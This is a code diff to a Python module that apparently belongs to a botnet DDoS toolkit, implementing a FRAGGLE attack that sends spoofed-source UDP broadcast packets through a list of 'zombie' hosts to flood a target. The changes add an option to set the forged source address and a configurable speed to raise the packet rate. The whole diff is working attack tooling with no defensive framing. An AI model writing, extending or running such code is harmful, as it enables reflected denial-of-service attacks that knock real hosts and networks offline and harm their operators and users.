@@ -11,6 +11,8 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import sys, random, socket
 import urllib.parse
+
+from core.mods.mod_config import FRAGGLE_SPEED
 try:
     from scapy.all import *
 except:
@@ -45,7 +47,7 @@ def sIP(base_stations): # extract 'base stations'
         s_zombie_ip = bs.get(s_zombie)
     return s_zombie_ip
 
-def fraggleize(ip, sport, rounds):
+def fraggleize(ip, sport, rounds, source = None):
     f = open('botnet/zombies.txt') # use 'zombies' as 'base stations'
     base_stations = f.readlines()
     base_stations = [ base_station.replace('\n','') for base_station in base_stations ]
@@ -63,6 +65,10 @@ def fraggleize(ip, sport, rounds):
             IP_p = IP()
             try:
                 IP_p.src = ip # UDP 'broadcast' package carring fraudulent (spoofed) source IP belonging to target (aka FRAGGLE attack)
+                if source is None:
+                    IP_p.src = ip
+                else:
+                    IP_p.src = source
             except:
                 print("[Error] [AI] [FRAGGLE] Imposible to resolve IP from target! -> [Aborting!]\n")
                 break
@@ -74,14 +80,14 @@ def fraggleize(ip, sport, rounds):
             try:
                 send(IP_p/UDP(), verbose=0)
                 print("[Info] [AI] [FRAGGLE] Redirecting 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"] -> [RE-FLUXING!]")
-                time.sleep(1) # sleep time required for balanced sucess
+                time.sleep(1/FRAGGLE_SPEED) # sleep time required for balanced sucess
             except:
                 print("[Error] [AI] [FRAGGLE] Failed to redirect 'base station' ["+str(n)+"] ["+str(s_zombie_ip)+"]")
     except:
         print("[Error] [AI] [FRAGGLE] Failing to engage... -> Is still target online? -> [Checking!]")
 
 class FRAGGLE(object):
-    def attacking(self, target, rounds):
+    def attacking(self, target, rounds, source=None):
         print("[Info] [AI] UDP Broadcast (FRAGGLE) is redirecting: [" , rounds, "base stations ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
@@ -105,4 +111,4 @@ class FRAGGLE(object):
         if ip == "127.0.0.1" or ip == "localhost":
             print("[Info] [AI] [FRAGGLE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
-        fraggleize(ip, sport, rounds) # attack with FRAGGLE using threading
+        fraggleize(ip, sport, rounds, source) # attack with FRAGGLE using threading
